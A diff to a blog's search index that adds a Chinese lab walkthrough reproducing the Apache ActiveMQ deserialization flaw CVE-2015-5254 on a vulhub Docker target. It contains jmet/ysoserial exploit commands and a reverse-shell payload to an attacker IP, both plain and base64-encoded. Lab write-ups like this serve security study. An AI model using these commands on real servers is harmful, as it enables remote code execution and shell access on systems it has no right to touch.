@@ -1,9 +1,12 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title></title>
+    <title><![CDATA[ActiveMQ 反序列化漏洞(CVE-2015-5254)]]></title>
     <url>%2F2019%2F07%2F21%2FActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2015-5254)%2F</url>
     <content type="text"><![CDATA[ActiveMQ 反序列化漏洞(CVE-2015-5254)漏洞详情 Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。 ActiveMQ启动后，将监听61616和8161两个端口，其中消息在61616这个端口进行传递，使用ActiveMQ这个中间件的程序也通过这个端口工作，8161是Web服务的端口，通过Web页面可管理ActiveMQ 0x01 漏洞环境 1.在Centos 7下安装docker/docker-se: 安装pip curl -shttps://bootstrap.pypa.io/get-pip.py | python3 # 安装最新版docker curl -s https://get.docker.com/ | sh # 启动docker服务 service docker start # 安装compose pip install docker-compose # 下载项目 wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip unzip vulhub-master.zip cd vulhub-master # 进入某一个漏洞/环境的目录 cd activemq/CVE-2015-5254/ # 自动化编译环境 docker-compose build 2.运行漏洞环境 docker-compose up -d 环境运行后，将监听61616和8161两个端口其中61616是工作端口，消息在这个端口进行传递; 8161是网络管理页面端口访问http://your-ip:8161即可看到网络管理页面，不过这个漏洞理论上是不需要网络的。 使用浏览器直接访问activemq，查看是否部署完毕 http://192.168.199.173:8161/admin/（默认用户名/密码：admin/admin） 0x02 漏洞复现 1.漏洞利用过程如下： a.构造（可以使用ysoserial）可执行命令的序列化对象 b.作为一个消息，发送给目标61616端口 c.访问的Web管理页面，读取消息，触发漏洞 2.使用jmet进行漏洞利用: 首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。 cd /usr/local/src wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar mkdir external 3.执行命令 java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/pocket” -Yp ROME 192.168.199.173 61616 4.此时会给目标的ActiveMQ添加一个名为事件的队列，可以我们通过http://192.168.199.173:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息： 5.点击查看这条消息即可触发命令执行 6.此时进入容器 7.查看/tmp下是否创建了pocket文件 ##漏洞利用成功 8.反弹shell java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -i &gt;&amp; /dev/tcp/192.168.199.173/9876 0&gt;&amp;1” -Yp ROME 192.168.199.173 61616 ##第一个ip地址为攻击者IP，第二个为靶机IP。 这里需要一些小技巧来绕过java的机制 bash -c {echo,payload的basse64编码}|{base64,-d}|{bash,-i} 所以，反弹shell的命令应是： java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OS4xNzMvOTg3NiAwPiYx}|{base64,-d}|{bash,-i}” -Yp ROME 192.168.199.173 61616 端口监听： 通过点击相应的事件触发漏洞：]]></content>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
   </entry>
   <entry>
     <title><![CDATA[Hello Hexo]]></title>
